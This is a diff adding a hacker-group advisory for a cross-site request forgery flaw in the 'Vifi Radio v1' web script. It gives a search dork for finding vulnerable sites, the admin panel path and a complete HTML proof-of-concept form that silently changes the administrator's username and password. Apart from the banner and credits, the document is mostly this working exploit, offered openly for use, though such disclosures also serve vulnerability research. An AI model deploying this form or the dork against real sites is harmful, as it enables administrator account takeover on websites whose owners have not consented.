@@ -1,0 +1,51 @@
+                .__        _____        _______                
+                |  |__    /  |  |___  __\   _  \_______   ____ 
+                |  |  \  /   |  |\  \/  /  /_\  \_  __ \_/ __ \
+                |   Y  \/    ^   />    <\  \_/   \  | \/\  ___/
+                |___|  /\____   |/__/\_ \\_____  /__|    \___  >
+                     \/      |__|      \/      \/            \/
+                         _____________________________ 
+                        /   _____/\_   _____/\_   ___ \
+                        \_____  \  |    __)_ /    \  \/   http://h4x0resec.blogspot.com
+                        /        \ |        \\     \____
+                       /_______  //_______  / \______  /
+                               \/         \/         \/         
+Vifi Radio v1 - CSRF (Arbitrary Change Password) Exploit
+~~~~~~~~~~~~~~~[My]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[+] Discovered by: KnocKout
+[~] Contact : knockout@e-mail.com.tr
+[~] HomePage : http://h4x0resec.blogspot.com / http://milw00rm.com
+[~] Greetz: BARCOD3, ZoRLu, b3mb4m, _UnDeRTaKeR_, DaiMon, VoLqaN, EthicalHacker,
+Oguz Dokumaci ( d4rkvisuaL ) Septemb0x, KedAns-Dz, indushka, Kalashinkov
+############################################################
+~~~~~~~~~~~~~~~~[Software info]~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+|~Web App. : Vifi Radio
+|~Affected Version : v1
+|~Software : http://scriptim.org/market-item/vifi-v1-radyo-scripti/ & http://vifibilisim.com/scriptlerimiz-29-Radyo_Siteleri_Icin_Script.html 
+|~Official Demo :  http://radyo.vifibilisim.com
+|~RISK : Medium
+|~DORK : inurl:index.asp?radyo=2
+|~Tested On : [L] Windows 7, Mozilla Firefox
+########################################################
+----------------------------------------------------------
+                      PoC
+----------------------------------------------------------
+<html>
+  <body>
+    <form action="http://[TARGET]/yonetim/kullanici-kaydet.asp?tur=g" method="POST">
+      <input type="hidden" name="rutbe" value="1" />
+      <input type="hidden" name="djadi" value="0" />
+      <input type="hidden" name="resim" value="Vifi+Bili%FEim" />
+      <input type="hidden" name="firma" value="USERNAME" />
+      <input type="hidden" name="link" value="PASSWORD" />
+      <input type="hidden" name="sira" value="23" />
+      <input type="hidden" name="ilet" value="G%D6NDER" />
+      <input type="hidden" name="Submit" value="Exploit!" />
+	  <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+############################
+"Admin Panel: /yonetim "
+############################
